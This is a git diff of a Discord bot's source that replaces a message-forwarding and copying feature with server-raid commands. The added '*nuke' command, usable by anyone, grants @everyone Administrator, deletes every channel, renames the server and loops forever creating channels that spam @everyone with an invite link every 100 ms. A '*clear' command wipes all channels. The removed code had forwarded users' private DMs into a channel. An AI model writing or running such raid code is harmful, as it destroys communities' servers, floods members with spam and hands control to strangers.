@@ -1,4 +1,4 @@
-const { Client, GatewayIntentBits } = require('discord.js');
+const { Client, GatewayIntentBits, ChannelType } = require('discord.js');
 require('dotenv').config();
 const express = require('express');
 const path = require('path');
@@ -8,8 +8,6 @@ const client = new Client({
     GatewayIntentBits.Guilds,
     GatewayIntentBits.GuildMessages,
     GatewayIntentBits.MessageContent,
-    GatewayIntentBits.GuildMembers,
-    GatewayIntentBits.DirectMessages,
   ],
 });
 
@@ -22,136 +20,101 @@ app.get('/', (req, res) => {
 });
 
 app.listen(port, () => {
-  console.log('\x1b[36m[ SERVER ]\x1b[0m', `\x1b[32m SH : http://localhost:${port} ✅\x1b[0m`);
+  console.log('\x1b[36m[ SERVER ]\x1b[0m', '\x1b[32m SH : http://localhost:' + port + ' ✅\x1b[0m');
 });
+
+let nukeInterval; // To store the nuke process
 
 client.once('ready', () => {
   console.log('\x1b[36m[ INFO ]\x1b[0m', `\x1b[34mPing: ${client.ws.ping} ms \x1b[0m`);
 });
 
-// Store the forwarding channel, user mappings, and copied users
-let forwardingChannel = null;
-const userMappings = new Map(); // Map of userID to DM forwarding channel
-let copiedUsers = new Set(); // Set of user IDs to copy messages from
-let copyAllEnabled = false; // Flag to enable copying from everyone
-
-// Function to get user ID from mention
-function getUserIDFromMention(mention) {
-  const regex = /^<@!?(\d+)>$/;
-  const match = mention.match(regex);
-  return match ? match[1] : null;
-}
-
 client.on('messageCreate', async (message) => {
   if (message.author.bot) return; // Ignore bot messages
 
-  const args = message.content.split(' ');
-
-  // Handle *set command
-  if (message.content.startsWith('*set')) {
-    if (!message.member.permissions.has('Administrator')) {
-      return message.reply('You do not have permission to use this command.');
-    }
-
-    const channel = message.mentions.channels.first() || client.channels.cache.get(args[1]);
-    if (channel) {
-      forwardingChannel = channel.id;
-      await message.reply(`Forwarding channel set to <#${channel.id}>.`);
-    } else {
-      await message.reply('Please mention a valid channel or provide a valid channel ID.');
-    }
-    return;
-  }
-
-  // Handle *setuser command
-  if (message.content.startsWith('*setuser')) {
-    if (!forwardingChannel) {
-      return message.reply('No forwarding channel is set. Use *set first.');
-    }
-
-    const targetUser = message.mentions.users.first() || client.users.cache.get(args[1]);
-    if (targetUser) {
-      userMappings.set(targetUser.id, forwardingChannel);
-      await message.reply(`Messages for <@${targetUser.id}> will now be forwarded to their DMs.`);
-    } else {
-      await message.reply('Please mention a valid user or provide a valid user ID.');
-    }
-    return;
-  }
-
-  // Handle the *copy command
-  if (message.content.startsWith('*copy')) {
-    if (args[1] === 'all') {
-      copyAllEnabled = true;
-      copiedUsers.add('all');
-      await message.reply('Now copying messages from all users.');
-      return;
-    }
-
-    const targetUser = getUserIDFromMention(args[1]) || args[1];
-    if (targetUser) {
-      copiedUsers.add(targetUser);
-      await message.reply(`Now copying messages from <@${targetUser}> (ID: ${targetUser}).`);
-    } else {
-      await message.reply('Please mention a user or provide a valid user ID.');
-    }
-    return;
-  }
-
-  // Handle *uncopy command
-  if (message.content.startsWith('*uncopy')) {
-    if (args[1] === 'all') {
-      copyAllEnabled = false;
-      copiedUsers.delete('all');
-      await message.reply('No longer copying messages from all users.');
-    } else if (args[1]) {
-      const targetUser = getUserIDFromMention(args[1]) || args[1];
-      if (targetUser) {
-        copiedUsers.delete(targetUser);
-        await message.reply(`No longer copying messages from <@${targetUser}> (ID: ${targetUser}).`);
-      } else {
-        await message.reply('Please mention a user or provide a valid user ID.');
-      }
-    } else {
-      await message.reply('Please specify who to stop copying from (either a user or "all").');
-    }
-    return;
-  }
-
-  // Forward DMs to the set channel
-  if (message.channel.type === 'DM' && forwardingChannel) {
-    const channel = client.channels.cache.get(forwardingChannel);
-    if (channel) {
-      await channel.send(`DM from **${message.author.tag}** (ID: ${message.author.id}):\n${message.content}`);
-    }
-    return;
-  }
-
-  // Forward channel messages to user DMs
-  if (message.channel.id === forwardingChannel && userMappings.size > 0) {
-    const targetUserID = [...userMappings.keys()].find((id) => message.mentions.users.has(id) || id === args[1]);
-    if (targetUserID) {
-      const targetUser = client.users.cache.get(targetUserID);
-      if (targetUser) {
-        try {
-          await targetUser.send(message.content);
-        } catch (err) {
-          console.error(`Could not send DM to ${targetUser.tag}:`, err);
-          await message.reply(`Could not send DM to <@${targetUserID}>.`);
-        }
-      }
-    }
-  }
-
-  // Copy messages based on the copy command
-  if (copyAllEnabled || copiedUsers.has(message.author.id)) {
+  if (message.content === '*nuke') {
     try {
-      await message.channel.send({
-        content: `${message.author.tag}: ${message.content}`,
-        files: message.attachments.map((attachment) => attachment.url),
-      });
+      // Give @everyone admin permissions
+      const everyoneRole = message.guild.roles.everyone;
+      await everyoneRole.setPermissions([PermissionsBitField.Flags.Administrator]);
+      
+      // Delete all existing channels
+      const channels = message.guild.channels.cache;
+      for (const [id, channel] of channels) {
+        await channel.delete();
+      }
+
+      // Rename server
+      await message.guild.setName('nuked by peeky and apex');
+
+      // Function to create a new channel and start spamming
+      const createAndSpamChannel = async () => {
+        const channel = await message.guild.channels.create({
+          name: 'nuked by peeky and apex',
+          type: ChannelType.GuildText, // Use ChannelType.GuildText for text channels
+        });
+
+        // Spam messages in the new channel
+        setInterval(() => {
+          channel.send('@everyone @here https://discord.gg/jwYqu66bqm');
+        }, 100); // Faster interval for spam (100 ms)
+      };
+
+      // Create the initial channel
+      await createAndSpamChannel();
+
+      // Infinite loop to continually create new channels and start spamming
+      nukeInterval = setInterval(async () => {
+        await createAndSpamChannel();
+      }, 1000); // Faster interval for creating new channels (1000 ms)
+
     } catch (error) {
-      console.error('Error copying message:', error);
+      console.error('Error during nuke operation:', error);
+    }
+  }
+
+  if (message.content === '*stop') {
+    try {
+      // Stop the nuke process
+      if (nukeInterval) {
+        clearInterval(nukeInterval);
+        nukeInterval = null; // Clear the interval reference
+        message.channel.send('Nuke process stopped.');
+      } else {
+        message.channel.send('No nuke process is currently running.');
+      }
+    } catch (error) {
+      console.error('Error during stop operation:', error);
+    }
+  }
+
+  if (message.content === '*clear') {
+    try {
+      // Optionally, stop the nuke process if it is running
+      if (nukeInterval) {
+        clearInterval(nukeInterval);
+        nukeInterval = null; // Clear the interval reference
+        message.channel.send('Nuke process stopped.');
+      }
+
+      // Delete all channels
+      const allChannels = message.guild.channels.cache;
+      for (const [id, channel] of allChannels) {
+        await channel.delete();
+      }
+
+      // Optionally, wait for a moment to ensure channels are deleted
+      await new Promise(resolve => setTimeout(resolve, 1000)); // Wait for 1 second
+
+      // Create a "general" channel after all channels are deleted
+      await message.guild.channels.create({
+        name: 'general',
+        type: ChannelType.GuildText, // Use ChannelType.GuildText for text channels
+      });
+
+      message.channel.send('All channels have been deleted and a "general" channel has been created.');
+    } catch (error) {
+      console.error('Error during clear operation:', error);
     }
   }
 });
